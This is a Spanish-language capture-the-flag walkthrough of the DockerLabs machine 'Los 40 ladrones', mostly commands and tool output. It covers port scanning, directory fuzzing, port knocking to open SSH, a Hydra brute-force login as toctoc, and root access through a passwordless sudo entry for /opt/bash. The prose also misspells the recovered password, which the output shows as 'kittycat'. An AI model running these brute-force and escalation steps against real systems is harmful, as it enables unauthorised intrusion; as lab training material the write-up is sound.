# 🖥️ Writeup - Los 40 ladrones 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip los40ladrones.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh los40ladrones.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 19:11 CET
Nmap scan report for 172.17.0.2
Host is up (0.000070s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

Identificamos que únicamente el puerto `80` está abierto.

Accedemos al servicio web del puerto `80` y nos encontramos con una página por defecto de `Apache2`.

# GOBUSTER 

Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,zip,php,txt,bak,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10792]
/qdefense.txt         (Status: 200) [Size: 111]
Progress: 600570 / 1543899 (38.90%)
```

Encontramos un archivo interesante, navegamos a la ruta para visualizarlo y dice lo siguiente:

```
Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```

Este mensaje nos da una gran pista. Parece indicarnos que debemos realizar `port knocking` con la secuencia 7000, 8000, 9000.

```bash
knock 172.17.0.2 7000 8000 9000
```

Volvemos a escanear los puertos para comprobar si se ha abierto alguno nuevo.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 19:20 CET
Nmap scan report for 172.17.0.2
Host is up (0.000032s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.76 seconds
```

Y efectivamente, el puerto `22` (SSH) ahora está accesible.

# HYDRA

En el mensaje anterior se hacía referencia a `toctoc` como un posible usuario, por lo que intentamos un ataque de `fuerza bruta` contra el servicio `SSH`.

```bash
hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -f -I
```

Info:
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-02 19:24:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 227.00 tries/min, 227 tries in 00:01h, 14344175 to do in 1053:11h, 13 active
[STATUS] 218.33 tries/min, 655 tries in 00:03h, 14343747 to do in 1094:57h, 13 active
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
```

Encontramos credenciales válidas para el usuario `toctoc` : `kittykat`.

Accedemos por `SSH`.

```bash
ssh toctoc@172.17.0.2
```

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```bash
sudo -l
```

Info:
```
Matching Defaults entries for toctoc on 7869897be703:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User toctoc may run the following commands on 7869897be703:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

Vemos que podemos ejecutar el binario `bash` con privilegios de `root` sin proporcionar contraseña, por lo que la escalada es sencilla mediante el siguiente comando:

```bash
sudo /opt/bash
```

Info:
```
root@7869897be703:/home/toctoc# whoami
root
root@7869897be703:/home/toctoc#
```

Ya somos root!